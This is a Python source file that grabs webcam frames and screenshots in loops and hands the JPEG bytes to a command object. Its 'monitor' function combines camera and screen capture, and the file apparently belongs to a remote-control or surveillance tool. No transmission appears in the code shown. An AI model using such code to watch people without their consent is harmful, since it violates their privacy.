import cv2
import pyautogui
import numpy as np
from PIL import ImageGrab

def takePicture(cap):
    encode_param= [int(cv2.IMWRITE_JPEG_QUALITY), 40]

    _, frame = cap.read()
    _, frame = cv2.imencode(".jpg",frame, encode_param)
    frame = frame.tobytes()

    return frame


def takeScreenshot():
    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 20]

    numpy_array = np.array(ImageGrab.grab(bbox=None))
    numpy_array = cv2.cvtColor(numpy_array, cv2.COLOR_RGB2BGR)

    width, height = pyautogui.size()
    numpy_array = cv2.resize(numpy_array, (int(width*0.5), int(height*0.5)))

    _, frame = cv2.imencode(".jpg", numpy_array, encode_param)
    frame = frame.tobytes()

    print(len(frame))
    return frame


def facetime(command):
    cap = cv2.VideoCapture(0)
    cap.set(3, 320)
    cap.set(4, 240)

    while command.shouldRun:
        frame = takePicture(cap)
        command.file = frame

    cap.release()

    return "Successfully ended facetime"


def screenshare(command):
    while command.shouldRun:
        frame = takeScreenshot()
        command.file = frame
    
    return "Successfully ended screenshare"


def monitor(command):
    cap = cv2.VideoCapture(0)
    cap.set(3, 320)
    cap.set(4, 240)

    while command.shouldRun:
        screenshot = takeScreenshot()
        picture = takePicture(cap)

        command.file = picture + b"<SPLIT>" + screenshot

    cap.release()

    return "Successfully ended monitoring"

        



